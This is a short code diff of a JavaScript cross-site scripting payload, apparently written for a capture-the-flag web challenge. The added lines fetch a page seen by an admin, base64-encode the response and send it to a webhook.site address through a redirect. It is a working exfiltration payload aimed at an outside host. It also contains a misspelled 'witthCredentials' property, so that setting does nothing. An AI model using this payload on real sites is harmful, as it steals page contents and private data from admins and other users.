@@ -1,13 +1,13 @@
-//var req = new XMLHttpRequest();
+var req = new XMLHttpRequest();
 //step1
-//req.open("GET", "http://politenotepad.zajebistyc.tf/", false);
+req.open("GET", "https://small-web-chall.knping.pl/", false);
 //step2
 //req.open("GET", "http://politenotepad.zajebistyc.tf/note/NMRqFJTnDDkjUbRAmmQuJhtdKmQdfm", false);
-//req.witthCredentials = true;
-//req.send()
-//var res = req.responseText;
+req.witthCredentials = true;
+req.send()
+var res = req.responseText;
 
-location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?b=" + btoa(res)
+location.href="https://webhook.site/715b1c2b-6199-4f82-a92b-14a4ae53e8b4?b=" + btoa(res)
 
 //Admin view of a page
 
